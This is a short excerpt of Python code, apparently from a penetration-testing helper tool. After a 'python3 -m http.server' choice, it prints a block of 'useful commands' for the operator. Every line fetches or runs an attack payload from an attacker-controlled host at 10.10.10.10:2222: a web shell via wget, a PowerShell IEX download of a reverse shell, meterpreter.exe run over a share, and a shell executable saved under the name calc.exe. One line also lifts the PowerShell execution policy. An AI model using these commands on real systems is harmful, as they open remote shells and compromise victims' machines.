      ...
      if checkParams != 0:
        if HTTP != "":
            ...
            if choice[:22] == "python3 -m http.server":
               print(colored("\nUSEFUL COMMANDS\n",colour7,attrs=['bold']))
               print("wget \"http://10.10.10.10:2222/shell.php\"")
               print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted")
               print("powershell \"IEX(New-Object Net.WebClient).downloadString('https://10.10.10.10:2222/reverseshell.ps1)'\"")
               print("C:\Windows\System32\cmd.exe /c \\\\10.10.10.10:2222\meterpreter.exe")
               print("powershell \"iwr -Uri http://10.10.10.10:2222/shell.exe\" -outfile calc.exe")            
